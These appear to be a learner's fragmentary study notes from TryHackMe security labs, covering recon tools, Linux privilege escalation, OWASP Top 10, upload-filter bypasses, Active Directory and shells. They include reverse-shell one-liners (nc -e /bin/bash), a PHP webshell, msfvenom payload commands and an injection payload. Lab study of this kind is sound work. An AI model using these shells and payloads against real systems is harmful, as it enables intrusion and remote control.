# R

* Remember for web/general/security

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence
  * https://ipinfo.io/
* https://www.virustotal.com/gui/home/upload
* https://www.hybrid-analysis.com/
* https://otx.alienvault.com/ (An open-source threat tracking system)
* https://secalerts.co/
* https://stack.watch/
* https://cybr.com/
* https://www.acunetix.com/blog/articles/
*  many clients -> there is possibility a custom/helpdesk that can be used to attack


Refs

* https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/
* There is also the xxx you know

<hr class="sep-both">

# Notes

* netdiscover
* security triad: CIA.
* ftp://IP:port
* ftp xxx@IP -p port
* nmap –script=http-server-header.nse XXX (or -sC)
* http://www.itsecgames.com/index.htm
* https://attack.mitre.org/tactics/enterprise/
* https://appsec-labs.com/online-training/
* https://www.contrastsecurity.com/developer
* https://github.com/trickest/cve
* https://github.com/payloadbox
* https://github.com/michenriksen/aquatone
* https://github.com/projectdiscovery/subfinder
* https://github.com/s0md3v/Photon
* https://github.com/evyatarmeged/Raccoon
* https://github.com/laramies/theHarvester
* https://github.com/topics/osint (4.2)
* password reuse

<hr class="sep-both">

# Linux privilege esc

* https://tryhackme.com/room/linprivesc

```
Resetting passwords
Bypassing access controls to compromise protected data
Editing software configurations
Enabling persistence
Changing the privilege of existing (or new) users
Execute any administrative command
```

* hostname can be used to find the role of the foothold user (ex: website-dev)
* uname -a (kernel)
* /proc/version (processes, kernel version?, is gcc installed?)
* /etc/issue (maybe used to find the system)
* `ps -A: View all running processes` / `ps axjf: View process tree`
* see all users
* see the network interfaces/routes/communications (https://tryhackme.com/room/linprivesc netcat)
* (https://tryhackme.com/room/linprivesc find?)
* Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
* https://www.linuxkernelcves.com/cves
* LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
* https://tryhackme.com/room/linprivesc (hint/notes)
* LD_PRELOAD is a function that allows any program to use shared libraries. (https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
* `find / -type f -perm -04000 -ls 2>/dev/null`
* on nano: use it to read/write shadow/...
* https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/
* https://ctf101.org/
* https://devansh.xyz/osint/2021/09/11/weaponizing-favicon-ico.html
* https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
* Add new user

<hr class="sep-both">

# XXX

--- https://tryhackme.com/room/owasptop10

* https://tryhackme.com/room/owasptop10 (note about remediation)
* `;nc -e /bin/bash` (no every nc variant support `-e`, see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* https://www.php.net/manual/en/function.passthru.php (past command output raw?)
* cmd "ver" to see Windows version
* two user with the same username, such as "admin", and " admin". They say you can access the other account if things were done wrongly, but HOW?
* Sensitive Data Exposure: app that discloses user sensitive data accidentally (ex: database source...)
* ps -ef
* file xxx.db => sqlite3 file.db
  * .tables
  * PRAGMA table_info(table);
* XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data (in-band and out-of-band/blind)
  * It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. 
  * DoS SSRF
* Every XML document mostly starts with what is known as XML Prolog.
* <?xml version="1.0" encoding="UTF-8"?>
* XML allows validation using DTD and Schema.
* https://tryhackme.com/room/owasptop10 (details + DTD)
* see writeups
* https://owasp.org/www-project-secure-headers/
* https://duckduckgo.com/?q=2016%2C+Dyn&atb=v332-1&ia=web
* http://www.xss-payloads.com/index.html
* http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
* get target ip: window.location.hostname
* Replacing data with malicious code: Insecure Deserialisation
  * Coookies => user can edit values from its side, can decode them...
  * Ex: flask in Python pickle.load, that can load a cookie in which the base64 
  * encoded value could be a reverse shell.
* do good logging / do not display too much info about errors
* https://tryhackme.com/room/owasptop10 (notes, last)

--- https://tryhackme.com/room/owaspjuiceshop

* Recon by making requests pass through burp
* Email injection
* https://tryhackme.com/room/owaspjuiceshop
* ...

--- https://tryhackme.com/room/uploadvulns

* do not override an existing file. Usual practices are generating/assigning a name to the uploaded file. There could be prefixed/postfixed too. They could be checks if the name is taken.
* webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells)
* <?=system($_GET["cmd"] ?? "whoami");?>
* https://github.com/pentestmonkey/php-reverse-shell
* filter extensions (blacklist/whitelist)
* file type (MIME validation=Content-Type=<type>/<subtype>=https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types, Magic Number validation=bytes at the beginning of the file)
* file length
* file name (check not overriding protected file)
* file content
* Client-side: turn off JS, intercept (page:remove JS, file: edit), do the request manually: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
* BurpSuite intercept javascript: you need to remove `^js$` in options > intercept client requests / File extension does not match. You may have to clear the cache. https://stackoverflow.com/questions/37296343/modify-javascript-with-burp-if-js-is-in-separate-file-but-gets-loaded-in-the-s
* pathinfo to get the extension, then a blacklist with a switch. We can pass it easily with values such as PhP pHP... or php5... .phtml... https://en.wikipedia.org/wiki/PHP
* hexeditor to edit the hex of a file. Write X letters, save, open in hex editor, and replace them with magic number: https://en.wikipedia.org/wiki/List_of_file_signatures
* writeups
* Inspect the client side, try using valid files, see where it lands, what's the naming scheme... Test really weird extensions, to see if blacklist or whitelist. Try the geniune file with a malicious magic number, to see what is checked.
* check the server size filter
* gobuster check the size of the element found
* whatweb url

```
URL [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.196.97], JQuery[3.5.1], Object[image/svg+xml], Script, Title[Jewel], UncommonHeaders[access-control-allow-origin,front-end-https], X-Powered-By[Express], nginx[1.14.0]
```

* msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js
* `data:text/javascript;base64,` (can append directly)
* https://blog.cyberethical.me/
* stat xxx.file
* curl invalid_file_that_my_browser_cant_open to see the contents
* `nc -lnvp xxx`

---- https://tryhackme.com/room/picklerick

* nikto -h URL (Scan web server for known vulnerabilities)
* Baka
  * Directory to look at: /root, /home...
  * Don't forget to check sudo -l
* https://fr33s0ul.tech/index.html

XXX

* db_vulns

<hr class="sep-both">

## Windows

--- https://tryhackme.com/room/winadbasics

* Microsoft's Active Directory 
* simplifies the management of devices and users within a corporate environment
* computer stop working? create users?
* Windows domain is a group of users and computers under the administration of a given business
* centralise the administration of common components of a Windows computer network in a single repository called Active Directory (AD)
* The server that runs the Active Directory services is known as a Domain Controller (DC).
* Ex: login to a school network.
* Username: XXX\USER login on domain XXX with username USER
* Active Directory Domain Service (AD DS). This service acts as a catalogue that holds the information of all of the "objects" that exist on your network.
* Users (security principals=can login, can be assigned privileges over resources=file/printers) -> People/Services
* Machines (SP too, have an account which is the local admin). Machine Account passwords are automatically rotated out and are generally comprised of 120 random characters. The machine account name is the computer's name followed by a dollar sign.
* Security Groups (security principals): give priviledge to a group, assign users to it. See https://tryhackme.com/room/winadbasics https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#default-security-groups
* https://stackoverflow.com/questions/56820526/how-to-change-keyboard-layout-in-windows-console-cmd-or-wsl
* These objects are organised in Organizational Units (OUs) which are container objects that allow you to classify users and machines.
* List of others OUs https://tryhackme.com/room/winadbasics
* OUs are used to apply policies on a group of entities? they are part of one OUs. While Security Groups grant perms over resources, like allowing access to a shared folder.
* View > Advanced Features. Disable the protection to delete something. (Properties > Objects)
* Can delegate control. Ex: allow IT support to reset low-level accounts pass. If you right-click on a OU, then delegate, you would allow a user to have more priviledge over this OU.
* `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose` (reset sophie password)
* `Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose` (reset on login)
* Workstations (usual devices), Servers, DC
* Group Policy Management
  * Group Policy Objects (GPO). GPOs are simply a collection of settings that can be applied to OUs.
  * In the tab above, tou create GPO.
  * Something important to have in mind is that any GPO will apply to the linked OU and any sub-OUs under it.
  * Scope
  * GPOs are distributed to the network via a network share called SYSVOL in the DC
  * This share points by default to the C:\Windows\SYSVOL\sysvol\ directory on each of the DCs in our network.
  * Users must sync with it periodically, may force update with `gpupdate /force`
  * Drag the GPO to every OU
* protocols can be used for network authentication in windows domains 
* Kerberos: Used by any recent version of Windows. This is the default protocol in any recent domain. Users who log into a service using Kerberos will be assigned tickets. Think of tickets as proof of a previous authentication. The initial ticket is a Ticket Granting Ticket (TGT) that allow a user to request other tickets without sending credentials such as when accessing another service (share/db/...).
* NetNTLM: Legacy authentication protocol kept for compatibility purposes.
* See https://tryhackme.com/room/winadbasics + Tree/...

## Shells

--- https://tryhackme.com/room/introtoshells

* send us command line access to the server (a reverse shell)
* open up a port on the server which we can connect to in order to execute further commands (a bind shell). May be blocked by firewalls.
* xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:ip /u:u /p:pass
* **banner grabbing** (ncat/telnet)
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
* exploit/multi/handler
* /usr/share/webshells
* `nc ip port -e /bin/bash`
* In bind, the hacker is creating a server on the local machine.
* we can't run interactive command (requiring user input)
* `sudo rlwrap nc -lvnp 443`
* `python -c 'import pty;pty.spawn("/bin/bash")'`
* `export TERM=xterm` (give commands such as clear???)
* CTRL+Z then `stty raw -echo; fg`
* `reset` on finished
* sudo apt install rlwrap give us the basics aside the CTRL+C handler above
* Socat: transfer the socat binary https://github.com/andrew-d/static-binaries
* `Invoke-WebRequest -uri <LOCAL-IP>/file -outfile C:\\Windows\temp\file`
* Change terminal size
  * `stty -a` in another terminal to find the value you want
  * stty rows <number> / stty cols <number>
* `sudp python3 -m http.server 80`
* Maybe you could check out [penelope](https://github.com/brightio/penelope)

## Overconfidence

--- https://tryhackme.com/room/agentsudoctf

* `echo {A..Z} | tr ' ' '\n'`
* `echo {0..9} | tr ' ' '\n'`
* `dd bs=34562 skip=1 if=cutie.png.zip of=agent.zip`. The file was an image followed by a zip. (https://unix.stackexchange.com/questions/6852/best-way-to-remove-bytes-from-the-start-of-a-file)
* `7z x agent.zip` (https://stackoverflow.com/questions/28383199/error-while-unzipping-a-file-in-shell-script-need-pk-compat-v5-1-can-do-v4)
* Reverse search images (note below xxx)
* python2 / python3
* writeups

--- https://tryhackme.com/room/rrootme

* `gobuster -t 50`
* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4455 -o revshell.php`
* exploit/multi/handler
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4455 -o revshell2.php`
* `msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4455 -o revshell3.php5`
* `sudo bash -c "id"`
* https://www.revshells.com/
* TL;DR. Nothing explained to improve the shell worked. Could not run python commands, the shell was crashing. Had to use a web shell to run python commands. The meterpreter didn't work "as expected". The reverse tcp worked but it wasn't a good experience.
* writeups